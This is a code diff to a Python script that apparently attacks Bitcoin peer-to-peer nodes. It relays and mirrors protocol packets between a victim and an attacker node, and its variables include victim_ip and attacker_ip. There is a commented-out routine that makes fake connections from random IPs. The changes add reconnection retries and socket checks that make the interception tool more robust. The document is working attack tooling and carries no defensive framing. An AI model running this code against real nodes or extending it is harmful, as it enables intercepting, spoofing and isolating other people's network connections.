@@ -250,13 +250,19 @@ def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, inte
 
 	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
 
-	s.connect((dst_ip, dst_port))
-	version = version_packet(src_ip, dst_ip, src_port, dst_port)
-	s.sendall(version.to_bytes())
-	verack = s.recv(1924)
-	verack = msg_verack(bitcoin_protocolversion)
-	s.sendall(verack.to_bytes())
-	verack = s.recv(1024)
+	while True:
+		print('Attempting connection')
+		try:
+			s.connect((dst_ip, dst_port))
+			version = version_packet(src_ip, dst_ip, src_port, dst_port)
+			s.sendall(version.to_bytes())
+			verack = s.recv(1924)
+			verack = msg_verack(bitcoin_protocolversion)
+			s.sendall(verack.to_bytes())
+			verack = s.recv(1024)
+			break
+		except: time.sleep(5)
+
 	identity_socket.append(s)
 	create_task('Reconnected ' + src_ip, sniff_func, s, other_socket, src_ip, src_port, dst_ip, dst_port, interface)
 	print(f'Successfully reconnected ({dst_ip} : {dst_port})')
@@ -377,12 +383,13 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 		#close_connection(socket, mirror_socket, from_ip, from_port, interface)
 		#print("Closing socket because of error: " + str(e))
 		#make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = False, attempt_number = 3)
-	return
+	return True
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
 
 def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface, sniff_func):
+	if parent_thread.stopped(): return
 	from_ip = src_ip
 	from_port = src_port
 	to_ip = dst_ip
@@ -423,8 +430,8 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 
 
 	print(f'*** Mirrored response sent  ** {from_ip} --> {to_ip} ** {msg_type}')
-	if orig_socket == None: return False # If the original's socket isn't running, don't bother trying to relay
 	if msg_type == 'ping':
+		if socket == None: return False # If the destination socket isn't running, ignore packet
 		# Parse the message payload
 		msg = MsgSerializable.from_bytes(packet)
 
@@ -436,6 +443,7 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 			print(f'Lost connection to ({victim_ip} : {victim_port})')
 			reconnect(socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
 	else:
+		if orig_socket == None: return False # If the destination socket isn't running, ignore packet
 		try:
 			orig_socket.sendall(packet) # Relay to the victim
 		except Exception as e:
@@ -447,7 +455,7 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 		# parent_thread.stop()
 		# socket.close()
 
-	return
+	return True
 
 # Initialize the network
 def initialize_network_info():
